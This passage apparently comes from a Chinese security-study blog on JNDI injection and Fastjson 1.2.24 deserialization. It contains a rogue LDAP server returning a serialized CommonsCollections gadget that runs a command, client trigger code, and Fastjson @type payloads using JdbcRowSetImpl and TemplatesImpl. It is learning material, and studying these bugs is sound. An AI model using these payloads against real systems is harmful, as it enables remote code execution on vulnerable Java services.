class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);  </span><br><span class="line"> System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);  </span><br><span class="line"> ds.startListening();  </span><br><span class="line">  </span><br><span class="line"> &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">private</span> URL codebase;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * */</span> <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@inheritDoc</span>&#125;  </span></span><br><span class="line"><span class="comment"> * * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  </span></span><br><span class="line"><span class="comment"> */</span> <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();  </span><br><span class="line"> <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);  </span><br><span class="line"> <span class="keyword">try</span> &#123;  </span><br><span class="line">                sendResult(result, base, e);  </span><br><span class="line"> &#125;  </span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;  </span><br><span class="line">                e1.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;  </span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));  </span><br><span class="line"> System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);  </span><br><span class="line"> e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);  </span><br><span class="line"> <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();  </span><br><span class="line"> <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);  </span><br><span class="line"> <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;  </span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">// Payload2: 返回序列化Gadget  </span></span><br><span class="line"> <span class="keyword">try</span> &#123;  </span><br><span class="line">                e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;</span>));  </span><br><span class="line"> &#125; <span class="keyword">catch</span> (ParseException exception) &#123;  </span><br><span class="line">                exception.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">            result.sendSearchEntry(e);  </span><br><span class="line"> result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端代码，这里有两种触发方式，一种lookup，还有一种fastjson</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIGadgetClient</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">// lookup参数注入触发  </span></span><br><span class="line"> <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line"> context.lookup(<span class="string">&quot;ldap://localhost:1234/ExportObject&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">// Fastjson反序列化JNDI注入Gadget触发  </span></span><br><span class="line"> <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;  </span><br><span class="line"> JSON.parse(payload);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JNDI</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson基础</title>
    <url>/2025/03/10/FastJson%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="lXrTl">FastJson基础</h1>
<h2 id="hQtoG">FastJson 简介</h2>
<font style="color:rgb(80, 80, 92);">Fastjson 是 Alibaba 开发的 Java 语言编写的高性能 JSON 库，用于将数据在 JSON 和 Java Object 之间互相转换。</font>

<p><font style="color:rgb(80, 80, 92);">提供两个主要接口来分别实现序列化和反序列化操作。</font></p>
<p><code>JSON.toJSONString</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">将 Java 对象转换为 json 对象，序列化的过程。</font></p>
<p><code>JSON.parseObject/JSON.parse</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">将 json 对象重新变回 Java 对象；反序列化的过程</font></p>
<ul>
<li>所以可以简单的把 json 理解成是一个字符串</li>
</ul>
<h2 id="af4tf">环境配置</h2>

<ul>
<li>JDK7u21</li>
<li>Fastjson 1.2.24</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h2 id="JGHVL">简单小demo</h2>
定义一个`Person`类，为其设置setter/getter方法

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="aQ7yy">序列化</h3>
写一个序列化的代码，调用`JSON.toJsonStirng()`来序列化`Person`对象

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSONUser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.Person\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;abc\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.setAge(<span class="number">18</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741581603504-58ed2f84-07a8-4a8c-9c0d-4401d51a7592.png"></p>
<h3 id="mvgXU">反序列化</h3>
写一个反序列化的代码，调用`JSONObject.parseObject()`来反序列化`Person`对象

<p>（当需要还原出private的属性时，需要在JSON.parseObject&#x2F;JSON.parse中加上Feature.SupportNonPublicField参，当然一般没人给私有属性加setter）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSONUser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.Person\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;abc\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse</span> <span class="operator">=</span> JSON.parse(s);</span><br><span class="line">        System.out.println(parse);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741582884850-efa7c14e-964b-4ed5-80b9-b62066959094.png"></p>
<h4 id="cVjXD">小知识</h4>
Fastjson反序列化采用两个反序列化方法，分别为

<ul>
<li><code>&lt;font style=&quot;color:rgb(83, 83, 96);background-color:rgb(242, 242, 242);&quot;&gt;JSON.parseObject()&lt;/font&gt;</code></li>
<li><code>&lt;font style=&quot;color:rgb(83, 83, 96);background-color:rgb(242, 242, 242);&quot;&gt;JSON.parse()&lt;/font&gt;</code></li>
</ul>
<p><code>parseObject()</code>：返回<code>fastjsonJSONObject</code>类</p>
<p><code>parse()</code>：返回我们的类</p>
<p>下面我们可以看到，<code>parseObject()</code>返回<font style="color:rgb(80, 80, 92);">parseObject类，而</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;parse()&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">返回我们的User类</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740451295154-af89d742-b770-477e-a8d1-62c93c168bab.png"></p>
<p>但是可以通过在parseObject参数中传入类，达到和parse相同效果（也可以传入Student.class）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">parseObject(input,Object.class)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740451464436-ea6fe816-0714-4966-bb29-c00b3f4cc149.png"></p>
<h2 id="l8PMW">Fastjson反序列化漏洞</h2>
fastjson在反序列化字符串时，会寻找`@type`中的类，在反序列化过程中会自动调用该类的setter和getter方法，但并不是所有getter和setter都会被调用

<p>以下是满足条件的setter和getter的条件（可以根据源码分析出来，这里不多说了）：</p>
<p><strong>满足条件的setter</strong></p>
<ul>
<li>非静态函数</li>
<li>返回类型为void或当前类</li>
<li>参数个数为1个</li>
</ul>
<p><strong>满足条件的getter</strong></p>
<ul>
<li>非静态方法</li>
<li>无参数</li>
<li><strong>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</strong></li>
</ul>
<h3 id="Z1BNv">漏洞原理</h3>
Fastjson拥有自己的一套实现序列化和反序列化的机制，针对不同版本的Fastjson反序列化漏洞，原理都是一样的，只是针对不同黑名单的绕过利用

<p>攻击者传入一个恶意构造的JSON字符串，Fastjson在反序列化字符串时，得到恶意类并执行恶意类的恶意函数，导致恶意代码执行</p>
<p>我们看之前的代码Demo，他会调用该类的 构造方法、getter、setter方法，若这些方法中存在危险方法的话，即存在Fastjson的 反序列化漏洞</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.Person\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;abc\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">parse</span> <span class="operator">=</span> JSON.parse(s);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741583089073-ac0818a6-f11f-4dfb-8a08-5a00b0f4b02a.png"></p>
<h3 id="mwThh">POC写法</h3>
一般Fastjson反序列化的POC写法如下

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;@type&quot;</span>:<span class="string">&quot;xxx.xxx.xxx&quot;</span>,</span><br><span class="line"><span class="string">&quot;xxx&quot;</span>:<span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="olZbj">小结</h2>
在学习过程中，发现fastjson的好多东西都没学到，回来重新学习一下，前两天有点忙，所以博客没来得及更新QAQ]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson1.2.24</title>
    <url>/2025/03/11/Fastjson1-2-24/</url>
    <content><![CDATA[<h1 id="vVnol">Fastjson-1.2.24</h1>
<h2 id="W7xMF">环境</h2>
+ JDK8u65
+ 1.2.22 <= Fastjson <= 1.2.24

<p>pom.xml 文件导入如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.5</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-codec&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-codec&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.12</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h2 id="gQL0k">出网情况下</h2>
<h3 id="pKHDE">基于TemplatesImpl的利用链</h3>
<h4 id="zPmNk">分析</h4>
我们一定对TemplatesImpl有所了解，学习CC链时，就有它的身影，我们使用它的`getTransletInstance`方法去加载任意类

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">            <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">            <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            translet.postInitialization();</span><br><span class="line">            translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">            translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">            translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">            <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">                translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>继续深入的分析，我们已经在CC链专题中讲过了，这里就不再多说</p>
<p>我们要想走到<code>defineTransletClasses</code>方法，并进行实例化类，需要以下几个条件成立 </p>
<ul>
<li>_name 不等于 null</li>
<li>_class 等于 null</li>
<li><font style="color:#080808;background-color:#ffffff;">_tfactory 为 TransformerFactoryImpl</font></li>
</ul>
<p>因此在设想中，我们的poc大概是以下这样的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">evilClassPath</span> <span class="operator">=</span> <span class="string">&quot;E:\\JavaClass\\TemplatesBytes.class&quot;</span>;</span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"> \&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,</span></span><br><span class="line"><span class="string"> \&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],</span></span><br><span class="line"><span class="string"> &#x27;_name&#x27;:&#x27;Drunkbaby&#x27;,</span></span><br><span class="line"><span class="string"> &#x27;_tfactory&#x27;:&#123; &#125;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是实际上，<code>getTransletInstance</code>并不满足我们的getter的条件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        ......</span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们应该找哪里调用了该方法，发现只有<code>newTransformer</code>中调用了，但他不是符合setter或getter方法，继续向上找去，找到一个符合条件的setter与getter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">            transformer.setURIResolver(_uriResolver);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">            transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> transformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最终我们找到了方法<code>getOutputProperties</code>，是可以让我们利用的getter方法，它的返回值<code>Properties</code>正是一个<code>Map</code>类型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>大概链子如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getOutputProperties()  ---&gt; newTransformer() ---&gt; TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory);</span><br></pre></td></tr></table></figure>

<p>现在我们的大概POC如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">evilClassPath</span> <span class="operator">=</span> <span class="string">&quot;E:\\JavaClass\\TemplatesBytes.class&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"> \&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,</span></span><br><span class="line"><span class="string"> \&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],</span></span><br><span class="line"><span class="string"> &#x27;_name&#x27;:&#x27;Drunkbaby&#x27;,</span></span><br><span class="line"><span class="string"> &#x27;_tfactory&#x27;:&#123; &#125;,</span></span><br><span class="line"><span class="string"> \&quot;_outputProperties\&quot;:&#123; &#125;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="JawVE">实现</h4>
自己的poc不知道为什么一直无法弹出计算器，看了别的师傅的payload修改后才成功

